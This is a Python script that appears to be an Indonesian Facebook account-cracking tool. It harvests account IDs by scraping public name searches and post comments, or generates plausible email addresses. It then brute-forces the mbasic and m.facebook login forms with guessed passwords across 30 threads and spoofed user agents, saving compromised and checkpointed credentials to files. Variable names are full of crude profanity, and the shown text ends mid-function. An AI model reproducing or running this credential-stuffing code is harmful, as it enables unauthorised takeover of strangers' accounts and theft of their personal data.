#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
Developer By Jeeck X Nano And Xnxcode
"""
import bs4 # <========== IMPORT RANDOM PYTHON
import re
import time
import requests
import datetime
import os
import sys
import random
import platform
import json
import subprocess
import stdiomask
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
import requests as req
from urllib.parse import unquote
hp = platform.platform()
ses = requests.Session()
from colorama import Fore
Q = Fore.BLUE # <========== WARNA BIRU
J = Fore.LIGHTBLUE_EX # <========== WARNA BIRU
P = Fore.WHITE # <========== WARNA PUTIH
W = Fore.CYAN # <========== WARNA BIRUMUDA
I = Fore.GREEN # <========== WARNA IJO
H = Fore.GREEN # <========== WARNA IJO
N = Fore.GREEN # <========== WARNA IJO
U = Fore.YELLOW # <========== WARNA KUNING
M = Fore.RED # <========== WARNA MERAH
O = Fore.MAGENTA # <========== WARNA PINK
B = Fore.CYAN # <========== WARNA BIRU
q = Fore.BLUE # <========== WARNA BIRU
j = Fore.LIGHTBLUE_EX # <========== WARNA BIRU
p = Fore.WHITE # <========== WARNA PUTIH
w = Fore.CYAN # <========== WARNA BIRUMUDA
i = Fore.GREEN # <========== WARNA IJO
h = Fore.GREEN # <========== WARNA IJO
n = Fore.GREEN # <========== WARNA IJO
u = Fore.YELLOW # <========== WARNA KUNING
m = Fore.RED # <========== WARNA MERAH
o = Fore.MAGENTA # <========== WARNA PINK
b = Fore.CYAN # <========== WARNA BIRU
K = random.choice([U,J,O,B]) # <========== RANDOM WARNA
def banner(): # <========== BANNER
	os.system("clear")
	wardom = random.choice([J,U,W,I])
	wr(f"""
{O}╔═╗{wardom}┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─  {O}╔╗╔{wardom}┌─┐┬  ┌─┐┌─┐┬┌┐┌
{O}╠╣ {wardom}├─┤│  ├┤ ├┴┐│ ││ │├┴┐  {O}║║║{wardom}│ ││  │ ││ ┬││││
{O}╚  {wardom}┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  {O}╝╚╝{wardom}└─┘┴─┘└─┘└─┘┴┘└┘""")
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"] # <========== TANGGAL
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
nano_nini = f'OK-{hari}-{bulan}-{tahun}.txt'
nano_nana = f'CP-{hari}-{bulan}-{tahun}.txt'
ua_silent = [] # <========== BUAT LEN / STR
dump = []
sandi= []
cepeh = []
metode = []
tetel = []
opsi = []
proxy = []
id = []
id2 = []
loop = 0
ok = 0
cp= 0
for x in range(999): # <========== GENERATOR UA
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
	F = f'{A}{C}{D}{E}'
	rc = random.choice
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	F = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SAMSUNG SM-G{str(rr(111111,999999))}  Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko)  SamsungBrowser/{str(rr(1111,9999))}.{str(rr(111,999))} Chrome/{str(rr(1111111,9999999))} QQ/8.8.95.{str(rr(1111,9999))} Mobile Safari/537.36"
	if F in ua_silent:pass
	else:ua_silent.append(F)
def jalan(______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____): #<========= BUAT TEKS BERJALAN
	for ______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ANJINKKKK____ in ______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ + "\n":
		sys.stdout.write(______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ANJINKKKK____)
		sys.stdout.flush()
		time.sleep(0.05)
def wr(____MEMEK___KONTOL_ANJINK____BABI___ASUUU____MEMEK______LU___KEK______KONTOLLL_YA_____ANJINKKKK__): #<========= KATA TEKS BERJALAN KE BAWAH
	for ________NGENTOD______ENAK____GAK____SI_____YA____ANJINK____BABI____KONTOL___KAU____HARAM___  in ____MEMEK___KONTOL_ANJINK____BABI___ASUUU____MEMEK______LU___KEK______KONTOLLL_YA_____ANJINKKKK__ + '\n': 
		sys.stdout.write(________NGENTOD______ENAK____GAK____SI_____YA____ANJINK____BABI____KONTOL___KAU____HARAM___)
		sys.stdout.flush()
		time.sleep(1.0/1000)
def waktu():
    import time
    a=time.localtime()
    hr=a.tm_hour
    mn=a.tm_min
    sc=a.tm_sec
    return ('{}:{}:{}'.format(hr,mn,sc))
def salam(): #<========= BUAT SAMBUTAN SELAMAT HARI
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning" #<========= UCAPAN SELAMAT PAGI
	elif 12 <= hours < 15:timenow = "Good Afternoon" #<========= UCAPAN SELAMAT SIANG
	elif 15 <= hours < 18:timenow = "Good Evening" #<========= UCAPAN SELAMAT SORE
	else:timenow = "Good Night" #<========= UCAPAN SELAMAT MALAM
def menu(): # <========== MENU TOOLS
	banner()
	___nano___IP___ = requests.get("http://ip-api.com/json/").json()["query"] #<========= TAMPIL IP
	___nano___negara___ = requests.get("http://ip-api.com/json/").json()["country"] #<========= TAMPIL NEGARA
	___nano___re___ = requests.get("http://ip-api.com/json/").json()["regionName"] #<========= TAMPIL REGION
	___nano___ci___ = requests.get("http://ip-api.com/json/").json()["city"] #<========= TAMPIL CITY
	___nano___si___ = requests.get("http://ip-api.com/json/").json()["isp"] #<========= TAMPIL ISP
	___nano___org___ = requests.get("http://ip-api.com/json/").json()["org"] #<========= TAMPIL ORG
	___nano___ist___ = requests.get("http://ip-api.com/json/").json()["as"] #<========= TAMPIL AS
	wr(f"""
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |____{P}Alamat ippaddres            : {W}{___nano___IP___}
{W} |     |____{P}User From In          : {W}{___nano___negara___}
{W} |     |____{P}User Name Region      : {K}{___nano___re___}
{W} |     |____{P}User City In          : {K}{___nano___ci___}
{W} |     |____{P}Sim Online            : {I}{___nano___si___}
{W} |     |____{P}Org Online            : {I}{___nano___org___}
{W} |     |____{P}Informations          : {I}{___nano___ist___}
{W} |
{W} |__________{P}Developer Tools       : {I}Jecko Ramadhan XD {K}Jeeck X Nano
{W}       |    |___{P}WhatsApp          : {K}+6281392505882 
{W}       |    |___{P}Facebook          : {K}https://www.facebook.com/jecko.ramadhan.9
{W}       |
{W}       |_________{P}Github           : {K}https://github.com/Jeeck-XD
{W}            |____{P}Github           : {K}https://github.com/Jeeck-XN

{P}[{W}01{P}] Crack dari pencarian email
{P}[{W}02{P}] Crack dari pencarian email v2
{P}[{W}03{P}] Crack dari pencarian nama
{P}[{W}04{P}] Crack dari postingan komentar
{P}[{W}05{P}] Crack dari file
{P}[{W}06{P}] Bot pencarian nama
{P}[{W}07{P}] Bot auto download vidio
{P}[{W}08{P}] Check pendapatan crack
{P}[{W}09{P}] Check opsi akun\n""")
	jeeck = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if jeeck in ["01","1"]:
		email() # <========== CRACK EMAIL
	elif jeeck in ["02","2"]:
		emaill() # <========== CRACK EMAIL V2
	elif jeeck in ["03","3"]:
		nama() # <========== PENCARIAN NAMA
	elif jeeck in ["04","4"]:
		komen() # <========== DUMP KOMEN
	elif jeeck in ["05","5"]:
		file() # <========== CRACK FILE
	elif jeeck in ["06","6"]: # <========== BOT PENCARIAN NO LOGIN
		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}")
		username=search("https://mbasic.facebook.com/public/"+nama)
		for user in username:
			user=user.split("|")
			wr(f"""{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {I}{user[0]}
{W}     |_____{P}Username   : {I}{user[1]}""")
	elif jeeck in ["07","7"]: # <========== BOT DONLOD VIDIO
		url = input(f"\n{P}[{K}•{P}] Masukan url : {W}")
		url = url.replace("www","mbasic")
		nama = input(f"{P}[{K}•{P}] Nama hasil : {W}")
		result = down(url)
		result = req.get(result)
		size = round(int(result.headers.get("Content-Length"))/1024)
		jalan(f"\n{P}[{K}•{P}] Size hasil download {I}{size}")
		with open(f"/sdcard/Download/{nama}.mp4", "wb") as x:
			for data in result.iter_content(chunk_size=1024):
				x.write(data)
		jalan(f"\n{P}[{K}•{P}] Hasil download tersimpan di /sdcard/Download");exit()
	elif jeeck in ["08","8"]:
		hasi() # <========== HASIL CRACK
	elif jeeck in ["09","9"]:
		cek_opsi_cp() # <========== OPSI AKUN SESI
	else:
		jalan(f"\n{P}[{K}•{P}] {M}Masukanlah pilihan anda dengan benar ya anjink");menu()
def down(url): # <========== BOT
	result=req.get(url).text
	if "video_redirect" in result:
		url=re.search(r'href\=\"\/video\_redirect\/\?src\=(.*?)\"',result)
		url=url.group(1).replace(";","&")
		return unquote(url)
	else:
		jalan(f"\n{P}[{K}•{P}] {M}Vido tidak terdownload");exit()
def search(url): # <========== BOT
	global id
	req=requests.get(url).text
	usr=re.findall(r'<td class="bz ca"><a href="(.*?)"><div class="cb"><div class="cc">(.*?)</div></div>',req)
	for user in usr:
		username=user[0].replace("/","")
		if 'profile' in username:
			id.append(username.replace("profile.php?id=","")+"|"+user[1])
		else:
			id.append(username+"|"+user[1])
	if "Lihat Hasil Selanjutnya" in req:
		url=re.findall(r'<div class="l m" id="see_more_pager"><a href="(.*?)">',req)[0]
		search(url)
	return id
def email(): #<========= DUMP EMAIL V1
	rc = random.choice
	rr = random.randint
	bas = ["123","232","453","332","jr","225","3488","993","552","332","786","987","098","ganz","716","25","ff","123","456","983","113","331","441","333","666","777","898","987","7676","678","343","543","234","567","789"]
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','ganz','gtg','gege']
	global ok , cp
	nama = input(f"\n{P}[{K}•{P}] Masukan nama target : {W}")
	if "," in str(nama):
		exit(f"\n{P}[{K}•{P}] {M}Masukan nama max 1 nama saja ")
	doma = "@gmail.com"
	if "@" not in str(doma) or ".com" not in str(doma) :
		exit(f"\n{P}[{K}•{P}] {M}Eorr ya anjink babi")
	jumlah = input(f"{P}[{K}•{P}] Masukan max : {W}")
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s  "%(P,W,len(dump),P,W,I,D),end='')
		sys.stdout.flush()
	setting()
def file(): #<========= DUMP DARI FILE
	file = input(f"{P}[{K}•{P}] Masukan nama file : {W}")
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"\n{P}[{K}•{P}]{M} Pemisah salah goblok ")
			dump.append(data)
			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s "%(P,W,len(dump),P,W,I,uuid),end='')
			sleep(0.0000003)
	except FileNotFoundError:
		print(f"\n{P}[{K}•{P}]{M} File tidak di temukan / berkas kosong");time.sleep(2);back()
	print(f"\r{P}[{K}•{P}] Jumlah total accounts adalah {P}[{W}{len(dump)}{P}]")
	setting()
def nama(): #<========= DUMP ID NAMA
	nama=[]
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f"""\n{P}[{K}•{P}] Masukan nama target di bawah ini\n{P}[{K}•{P}] Anda bisa menggunakan tanda (,) sebagai pemisah\n""")
	nam = input(f"{P}[{K}•{P}] Masukan nama : {W}").split(",")
	for ser in nam:	
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(gas,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting
def gas (link): #<========= GET DATA NAMA
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s  "%(P,W,len(dump),P,W,I,nama),end='')
			sys.stdout.flush()
			gas(link)
	except:pass
def komen(): #<========= DUMP KOMEN
	ide = input(f"\n{P}[{K}•{P}] Masukan id postingan : {W}")
	url = 'https://mbasic.facebook.com/'+ide
	try:___nano___komentar___jeeck___(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		print(f"\n{P}[{K}•{P}]{M} Gagal dump id id bersifat tidak publik / cookie mati");time.sleep(2);back()
	setting()
def ___nano___komentar___jeeck___(url): #<========= DUMP ID KOMENTAR
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f"\r{P}[{K}•{P}] Proses dump id %s[%s%s%s] %s<-----> %s%s                         "%(P,W,len(dump),P,W,I,nama),end='')
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:___nano___komentar___jeeck___("https://mbasic.facebook.com"+z["href"])
			except:pass
def emaill(): #<========= DUMP EMAIL V2
	x = 0
	print(f"""\n{P}[{W}01{P}]{P} Dump email dari pencarian @gmail.com
{P}[{W}02{P}]{P} Dump email dari pencarian @yahoo.com
{P}[{W}03{P}]{P} Dump email dari pencarian @hotmail.com
{P}[{W}04{P}]{P} Dump email dari pencarian @outlook.com\n""")
	___ngentod___nano___ = input(f"{P}[{K}•{P}] Masukan menu : {W}")
	if ___ngentod___nano___ in["1"]:
		___nano___bandid_ = "@gmail.com" #<========= BUAT DUMP EMAIL GMAIL
		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}")
		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}"))
		for z in range(jumlah):
			x +=1
			dump.append(nama+str(x)+___nano___bandid_+"|"+nama)
			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush()
	elif ___ngentod___nano___ in["2"]:
		___nano___bandid_ = "@yahoo.com" #<========= BUAT DUMP EMAIL YAHO
		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}")
		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}"))
		for z in range(jumlah):
			x +=1
			dump.append(nama+str(x)+___nano___bandid_+"|"+nama)
			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush()
	elif ___ngentod___nano___ in["3"]:
		___nano___bandid_ = "@hotmail.com" #<========= BUAT DUMP EMAIL HOTMAIL
		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}")
		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}"))
		for z in range(jumlah):
			x +=1
			dump.append(nama+str(x)+___nano___bandid_+"|"+nama)
			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}] id");sys.stdout.flush()
	elif ___ngentod___nano___ in["4"]:
		___nano___bandid_ = "@outlook.com" #<========= BUAT DUMP EMAIL OUT LOK
		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}")
		jumlah = int(input(f"{P}[{K}•{P}] Masukan limit : {W}"))
		for z in range(jumlah):
			x +=1
			dump.append(nama+str(x)+___nano___bandid_+"|"+nama)
			sys.stdout.write(f"\r{P}[{K}•{P}] Proses pengambilan id sukses mengambil [{W}{len(dump)}{P}]  id");sys.stdout.flush()
	setting()
detek = []
def cek_opsi_cp(): # <========== CEK AKUN SESI
	nom, no = [], 0
	try:ok = os.listdir('CP')
	except:sys.exit(f"\n{P}[{K}•{P}]{M} File cp not found")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f"{P}[{W}0{no}{P}] {x} - {I}{len(jum)} {P}Akun !!")
	exc = input(f"\n{P}[{K}•{P}] Masukan nomor : {W}")
	file = nom[int(exc)-1]
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]'
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f"\r{P}[{K}•{P}] Check opsi telah selesai")
opsi = []
def sesi(res): # <========== AKUN SESI OPSI
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi
def hasil(): #<========= CHEK FILE CP DAN OK
	print(f"""
{P}[{W}01{P}] Check results accounts ok
{P}[{W}02{P}] Check results accounts cp
{P}[{W}03{P}] Back to menu \n""")
	__kentod__ = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if __kentod__ in ['1']: #<========= CHEK RESULTS OK
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"\n{P}[{K}•{P}]{M} File not found");exit()
		if len(vin)==0:
			print(f"\n{P}[{K}•{P}]{M} File not results");exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
				else:
					lol.update({str(cih):str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
			geeh = input(f"\n{P}[{K}•{P}] Pilih nomor : {W}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f"\n{P}[{K}•{P}]{M} File not found");exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{U}--------> {I}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit()
	elif __kentod__ in ['2']: #<========= CHECK RESULTS CP
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f"\n{P}[{K}•{P}]{M} File not found");exit()
		if len(vin)==0:
			print(f"\n{P}[{K}•{P}]{M} File not results");exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
				else:
					lol.update({str(cih):str(isi)})
					print(f"{P}[{W}{nom}{P}] {I}{isi} {U}{len(hem)}")
			geeh = input(f"\n{P}[{K}•{P}] Masukan nomor : {W}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"\n{P}[{K}•{P}]{M} Input yang anda masukan salah");exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f"\n{P}[{K}•{P}]{M} File not found");exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{U}--------> {K}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input(f"\n{P}[{K}•{P}] Cek selesai tekan enter");exit()
	elif __kentod__ in ['3']:
		menu() #<========= KEMBALI KE MENU TOOLS
def cek_opsi(idf,pw,ua): # <========== CEK OPSI
	akun = ''
	try:
		token = open('token.txt','r').read()
		bas = {"cookie":open('cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f"""
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {K}{idf}
{W} |     |____{P}Password  : {K}{pw}
{W} | \n"""
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+nano_nana,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f"""
{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}]
{W} |
{W} |_____{P}Userid         : {K}{idf}
{W} |     |____{P}Password  : {K}{pw}
{W} | \n"""
		if 'file' in detek:pass
		else:open('CP/'+nano_nana,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f"""{K} |___{P}Akun anda tapyes segera login di fb lite\n"""
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f"""{K} |___{M}Akun anda terpasang A2F \n"""
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f"""{K} |___{P}Akun anda tidak terjadi cp
{K}     |___{P}Cookkie : {I}{cok}\n"""
			else:
				akun += f"""{K} |\n"""
				o = 0
				for cp in opsi:
					o+=1
					akun += f"""{K} |____{O}0{o} {U}{cp}\n"""
		opsi.clear()
	except Exception as e:
		akun += f"""{K} |___{M}Password salah atau terjadi spam ip terhadap internet anda\n"""
	print('\r'+ akun)
	print('\r                                                                       ')
from datetime import datetime
akunok = []
def setting(): # <========== SETTING CRACK
	print(f"""\n
{P}[{W}01{P}] Mobile facebook
{P}[{W}02{P}] Mbasic facebook
{P}[{W}03{P}] Free facebook\n""")
	jeeck_gtg = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if jeeck_gtg in ["01","1"]:
		metode.append("mobile")
	elif jeeck_gtg in ["02","2"]:
		metode.append("mbasic")
	elif jeeck_gtg in ["03","3"]:
		metode.append("free")
	else:
		metode.append("mobile")
	nano_nani = input(f"\n{P}[{K}•{P}] Apakah anda ingin menampilkan opsi Y/N : {W}")
	if nano_nani in ["y","Y","ya","YA"]:
		cepeh.append('ya')
	print(f"""
{P}[{W}01{P}] Id tertua
{P}[{W}02{P}] Id termuda\n""")
	nano = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if nano in ["01","1"]:
		for x in dump:
			id.append(x)
	elif nano in ["02","2"]:
		for x in dump:
			id.insert(0,x)
	else:
		for x in dump:
			id.append(x)
	print(f"""
{P}[{W}01{P}] Pasword manual
{P}[{W}02{P}] Pasword gabung
{P}[{W}03{P}] Pasword defaults\n""")
	nani = input(f"{P}[{K}•{P}] Masukan pilihan : {W}")
	if nani in ["01","1"]:
		global ok,cp
		pwx = []
		wr(f"""\n{P}[{K}•{P}] Buatlah password di bawah ini\n{P}[{K}•{P}] Gunakan tanda (,) sebagai pemisah\n{P}[{K}•{P}] Membuat password minimal 6 kata / huruf\n""")
		nani = input(f"{P}[{K}•{P}] Buat password : {W}").split(",")
		for x in nani:
			pwx.append(x)
		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""")
		with tred(max_workers=30) as nani_nano:
			for akun in id:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				if 'mobile' in metode:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
				elif 'mbasic' in metode:
					nani_nano.submit(crack,idf,pwx,"mbasic.facebook.com")
				elif 'free' in metode:
					nani_nano.submit(crack,idf,pwx,"free.facebook.com")
				else:
					nani_nano.submit(crack,idf,pwx,"m.facebook.com")
		exit(f"\n{P}[{K}•{P}] Tools berhenti")
	elif nani in ["02","2"]:
		global ok,cp
		pwx = []
		angka = ["123456"]
		huruf = input(f"\n{P}[{K}•{P}] Buat pasword : {W}").split(",")
		random = random.choice(["ganteng","tampan","cans","canz"])
		if "," in str(random):
			jalan(f"\n{P}[{K}•{P}] Eror ya anjink");exit()
		wr(f"""\n{P}[{K}•{P}] Akun ok tersimpan di {I}{nano_nini}\n{P}[{K}•{P}] Akun cp tersimpan di {K}{nano_nana}\n""")
		with tred(max_workers=30) as nani_nano:
			for akun in id:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwx = angka+huruf
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass 
					else:
						pwx.append(depan+"123")
